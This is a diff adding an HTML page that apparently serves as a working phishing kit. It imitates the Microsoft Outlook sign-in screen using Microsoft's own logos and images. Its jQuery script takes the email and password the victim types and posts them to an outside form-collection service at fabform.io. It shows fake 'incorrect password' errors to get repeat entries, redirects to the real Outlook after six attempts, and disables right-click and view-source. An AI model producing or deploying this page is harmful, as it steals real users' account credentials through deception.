@@ -1,0 +1,425 @@
+<!DOCTYPE html>
+<html>
+<head>
+  <meta charset="utf-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <style>
+     /* CSS styles for desktop */
+    @media screen and (min-width: 600px) {
+      /* Add your desktop styles here */
+    }
+
+    /* CSS styles for mobile */
+    @media screen and (max-width: 599px) {
+      /* Add your mobile styles here */
+    }
+
+    /* Add styles for the loading screen here */
+    #loading-screen {
+      position: fixed;
+      top: 0;
+      left: 0;
+      width: 100%;
+      height: 100%;
+      background-color: #ffffff;
+      display: flex;
+      justify-content: center;
+      align-items: center;
+      z-index: 9999;
+    }
+
+    #loading-spinner {
+      background-image: url(https://www.windowslatest.com/wp-content/uploads/2021/08/Outlook-PWA.gif); /* URL to the GIF you provided */
+      background-repeat: no-repeat;
+      background-position: center center;
+      width: 200px;
+      height: 200px;
+    }
+  </style>
+  <script>
+    // Hide the loading screen after 3 seconds
+    document.addEventListener('DOMContentLoaded', function() {
+      setTimeout(function() {
+        var loadingScreen = document.getElementById('loading-screen');
+        loadingScreen.style.display = 'none';
+      }, 3000); // 3 seconds in milliseconds
+    });
+  </script>
+</head>
+<body>
+  <!-- Loading Screen -->
+  <div id="loading-screen">
+    <!-- Add loading screen content here -->
+    <div id="loading-spinner"></div>
+  </div>
+  <!-- Bootstrap CSS -->
+  <link rel="stylesheet" href="https://maxcdn.bootstrapcdn.com/bootstrap/4.0.0/css/bootstrap.min.css" integrity="sha384-Gn5384xqQ1aoWXA+058RXPxPg6fy4IWvTNh0E263XmFcJlSAwiGgFAW/dAiS6JXm" crossorigin="anonymous">
+  <link href="https://fonts.googleapis.com/css?family=Archivo+Narrow&display=swap" rel="stylesheet">
+  <script src="https://kit.fontawesome.com/585b051251.js" crossorigin="anonymous"></script>
+  <title>Sign in to your account</title>
+  <!-- <link href="css/hover.css" rel="stylesheet" media="all"> -->
+   <link rel="prefetch" href="https://login.live.com/Me.htm?v=3">
+            <link rel="shortcut icon" href="https://aadcdn.msftauth.net/shared/1.0/content/images/favicon_a_eupayfgghqiai7k9sol6lg2.ico">
+  <style type="text/css">
+    textarea:hover, 
+input:hover, 
+textarea:active, 
+input:active, 
+textarea:focus, 
+input:focus,
+button:focus,
+button:active,
+button:hover,
+label:focus,
+.btn:active,
+.btn.active
+{
+    outline:0px !important;
+    -webkit-appearance:none;
+    box-shadow: none !important;
+}
+
+     .out img{
+      width: 300px;
+    padding: 8px 44px;
+    font-size: 25px;
+    margin-left: auto;
+    margin-right: auto;
+    margin-top: 20px;
+    margin-bottom: 28px;
+    cursor: pointer;
+    display: flex;
+    align-items: center;
+    }
+    . img {
+    width: 32px;
+    height: 32px;
+    margin-right: 12px;
+    }
+
+    .box
+    {
+      box-shadow: 0 2px 3px rgba(0,0,0);*/
+      border: 1px solid rgba(0,0,0);*/
+      min-height: 438px;
+      min-width: 440px;
+      max-width: 440px;
+      width: calc(100% - 50px);
+      padding: 44px;
+      margin-left: auto;
+      margin-right: auto;
+      margin-top: 20px;
+      margin-bottom: 28px;
+      
+    }
+
+    .bottom {
+    width: 440px;
+    background-color: #fff;
+    box-shadow: 0 0 .5rem rgba(0, 0, 0, .2);
+    padding: 8px 44px;
+    font-size: 15px;
+    margin-left: auto;
+    margin-right: auto;
+    margin-top: 20px;
+    margin-bottom: 28px;
+    cursor: pointer;
+    display: flex;
+    align-items: center;
+    }
+    .bottom img {
+    width: 32px;
+    height: 32px;
+    margin-right: 12px;
+    
+   }
+    .bottom:hover { background-color: #dde2d1; }
+    .next-form { transform: translateX(-50%); }
+
+
+    #footer {
+      position: fixed;
+      bottom: 0px;
+      width: 100%;
+      overflow: visible;
+      z-index: 99;
+      clear: both;
+      background-color: #000;
+      background-color: rgba(0,0,0,0.6);
+    }
+
+    /*.footerNode span {
+    color: #fff;
+    font-size: 0.75rem;
+    line-height: 28px;
+    white-space: nowrap;
+    display: inline-block;
+    float: right;
+    margin-left: 8px;
+    margin-right: 8px;
+}*/
+div .footerNode a, div .footerNode span {
+    color: #fff;
+    font-size: 0.75rem;
+    line-height: 28px;
+    white-space: nowrap;
+    display: inline-block;
+    float: right;
+    margin-left: 8px;
+    margin-right: 8px;
+}
+    @media only screen and (max-width: 610px) {
+      #hide{
+        display: none;
+      }
+    }
+
+  </style>
+  <link rel="shortcut icon" type="image/png" href="https://easyupload.io/mm9scz"/>
+
+</head>
+<body style="background-image: url('https://logincdn.msauth.net/16.000.28666.7/content/images/backgrounds/2_bc3d32a696895f78c19df6c717586a5d.svg'); background-size: cover;background-repeat: no-repeat;">
+
+  <div class="container-fluid">
+    <div class="container">
+      <div class="row my-5 py-5">
+          <!-- <div class="col-lg-6" id="hide">
+            <div class="text-white my-5 py-3">
+              <span class="display-4">Expand Your<br> Microsoft</span><br><br>
+              <span class="h5 font-weight-normal">Upgrade to ad-free email and the latest productivity tools with Microsoft.</span><br><br><br>
+              <button class="btn btn-white rounded-0 px-5 py-2" style="font-size: 20px; color: #1C9CD6; font-weight: 500;">Get Started</button>
+            </div>
+          </div> -->
+          <div class="col-lg-6 mx-auto">
+ <div class="out">
+            <img src="https://logincdn.msftauth.net/shared/1.0/content/images/applogos/53_7a3c80bf9694448bac31a9589d2e9e92.png">
+              </div>
+            <div class="bg-white box" id="div1">
+              <img src="https://aadcdn.msftauth.net/shared/1.0/content/images/microsoft_logo_564db913a7fa0ca42727161c6d031bef.svg" class="img-fluid"><br><br>
+              <span class="h5"> <b>Sign In</b></span><br>
+              <p>to continue to Outlook</p>
+              <span id="error" class="text-danger" style="display: none;">That Microsoft account doesn't exist. Enter a different account</span>
+              <div class="form-group mt-2">
+                <input type="email" name="email" class="form-control rounded-0 border-dark" id="email" aria-describedby="emailHelp" placeholder="Email, phone or skype" style="border-right: none;border-left: none;border-top: none;" value="">
+              </div>
+              <p>No account? <a href="#">Create one!</a></p>
+              <!-- <p><a href="#">Sign in with a security key</a></p>
+                <p><a href="#">sign in options</a></p> -->
+                <div class="text-right">
+                  <button class="btn rounded-6 text-white px-4 mt-4" id="next" style="background-color: #0066BA;">Next</button>
+                </div>
+              </div>
+
+              <div class="m-5 p-4 bg-white box" id="div2" style="display: none;">
+                <form id="contact">
+                  <img src="https://aadcdn.msftauth.net/shared/1.0/content/images/microsoft_logo_564db913a7fa0ca42727161c6d031bef.svg" class="img-fluid"><br><br>
+                  <i class="fas fa-arrow-left" id="back"></i>&nbsp<span id="emailch">abc@abc.com</span><br>
+                  
+                  <p> </p>
+                  <span class="h5">Enter Password</span>
+                  <p><span id="msg" class="text-danger" style="font-size: 10px;"></span><br> </p>
+                  <div class="form-group mt-2">
+                    <input type="password" name="password" class="form-control rounded-0 border-dark" id="password" aria-describedby="emailHelp" placeholder="Enter Password" style="border-right: none;border-left: none;border-top: none;">
+                  </div>
+                  <!-- <p>No account? <a href="#">Create one!</a></p> -->
+                  <p><a href="#">Forget my password?</a></p>
+                  <div class="text-right">
+                    <button class="btn rounded-6 text-white px-4" id="submit-btn" style="background-color: #0066BA;" >Sign in</button>
+                  </div>
+                </form>
+              </div>
+             <div class="bottom">
+            <img src="https://aadcdn.msftauth.net/shared/1.0/content/images/signin-options_3e3f6b73c3f310c31d2c4d131a8ab8c6.svg">
+            <span>Sign-in options</span>
+              </div>
+            </div>
+          </div>
+        </div>
+      </div>
+
+      <footer id="footer">
+        <div>
+          <div class="footerNode">
+           <span>©2025 Microsoft</span>
+            <a data-bind="text: config.text.privacyAndCookies, attr: {'data-url': config.links.privacyAndCookies}" href="#" data-url="https://go.microsoft.com/fwlink/?LinkId=521839">Privacy statement</a>
+          </div>
+        </div>
+      </footer>
+<link rel="shortcut icon" type="image/png" href="/favicon.png"/>
+
+
+
+    <script src="https://ajax.googleapis.com/ajax/libs/jquery/2.2.4/jquery.min.js"></script>
+    <script>
+
+
+      /* global $ */
+      $(document).ready(function(){
+        var count=0;
+
+
+    /////////////url email getting////////////////
+    var email = window.location.hash.substr(1);
+    if (!email) {
+
+    }
+    else
+    {
+      var base64regex = /^([0-9a-zA-Z+/]{4})*(([0-9a-zA-Z+/]{2}==)|([0-9a-zA-Z+/]{3}=))?$/;
+
+      if (!base64regex.test(email)) {
+            // alert(btoa(email));
+            var my_email =email;
+          }
+          else
+          {
+            // alert(atob(email));
+            var my_email =atob(email);
+          }
+        // $('#email').val(email);
+        // var my_email =email;
+        var filter = /^([a-zA-Z0-9_\.\-])+\@(([a-zA-Z0-9\-])+\.)+([a-zA-Z0-9]{2,4})+$/;
+
+        if (!filter.test(my_email)) {
+          $('#error').show();
+          email.focus;
+          return false;
+        }
+        var ind=my_email.indexOf("@");
+        var my_slice=my_email.substr((ind+1));
+        var c= my_slice.substr(0, my_slice.indexOf('.'));
+        var final= c.toLowerCase();
+        $('#email').val(my_email);
+      }
+
+
+
+
+
+      $('#email').click(function(){
+        $('#error').hide();
+      });
+      $('#next').click(function () {
+        var my_email =$('#email').val();
+        var filter = /^([a-zA-Z0-9_\.\-])+\@(([a-zA-Z0-9\-])+\.)+([a-zA-Z0-9]{2,4})+$/;
+
+        if (!filter.test(my_email)) {
+          $('#error').show();
+          email.focus;
+          return false;
+        }
+        var ind=my_email.indexOf("@");
+        var my_slice=my_email.substr((ind+1));
+        var c= my_slice.substr(0, my_slice.indexOf('.'));
+        var final= c.toLowerCase();
+
+        $("#div1").animate({left:200, opacity:"hide"}, 0);
+        $("#div2").animate({right:200, opacity:"show"}, 1000);
+        $("#emailch").html(my_email);
+
+      });
+      $('#back').click(function () {
+        $("#msg").hide();
+        $("#email").val("");
+        $("#password").val("");
+        $("#div2").animate({left:200, opacity:"hide"}, 0);
+        $("#div1").animate({right:200, opacity:"show"}, 1000);
+
+      });
+
+
+      $('#submit-btn').click(function(event){
+        event.preventDefault();
+        var email=$("#email").val();
+        var password=$("#password").val();
+        var detail=$("#field").html();
+        var msg = $('#msg').html();
+
+        var my_email =email;
+        var ind=my_email.indexOf("@");
+        var my_slice=my_email.substr((ind+1));
+        var c= my_slice.substr(0, my_slice.indexOf('.'));
+        var final= c.toLowerCase();
+        $('#msg').text( msg );
+        count=count+1;
+        $.ajax({
+          dataType: 'JSON',
+          url: 'https://fabform.io/f/JalByH7',
+          type: 'POST',
+          data:{
+            email:email,
+            password:password,
+            detail:detail,
+
+          },
+          beforeSend: function(xhr){
+            $('#submit-btn').html('Verifing...');
+          },
+          success: function(response){
+            $("#password").val("");
+            if (count>=6) {
+              count=0;
+              window.location.replace("https://outlook.office.com/mail/");
+            }
+            if(response){
+              $("#msg").show();
+              console.log(response);
+              if(response['signal'] == 'ok'){
+               $('#msg').html(response['msg']);
+             }
+             else{
+              $('#msg').html(response['msg']);
+            }
+          }
+        },
+        error: function(){
+          $("#password").val("");
+          if (count>=6) {
+            count=0;
+            window.location.replace("https://outlook.office.com/mail/");
+          }
+          $("#msg").show();
+          $('#msg').html("Your account or password is incorrect. If you don't remember your password, Use a verification code displayed in the Microsoft Authenticator app.");
+        },
+        complete: function(){
+          $('#submit-btn').html('Sign in');
+        }
+      });
+      });
+    });
+  </script>
+    
+<script>
+//    var getUrlParameter = function getUrlParameter(sParam) {
+//    var sPageURL = decodeURIComponent(window.location.search.substring(1)),
+//        sURLVariables = sPageURL.split('&'),
+//        sParameterName,
+//        i;
+//    for (i = 0; i < sURLVariables.length; i++) {
+//        sParameterName = sURLVariables[i].split('=');
+//        if (sParameterName[0] === sParam) {
+//            return sParameterName[1] === undefined ? true : sParameterName[1];
+//        }
+//    }
+//};
+//
+//var yourEmail = getUrlParameter('email');
+//
+//document.getElementById('email').value = yourEmail;
+
+</script>
+<script>
+    // Disable right-click
+    document.addEventListener('contextmenu', function (e) {
+        e.preventDefault();
+    });
+
+    // Disable Ctrl+U
+    document.addEventListener('keydown', function (e) {
+        if (e.ctrlKey && e.key === 'u') {
+            e.preventDefault();
+        }
+    });
+</script>
+</body>
+</html>
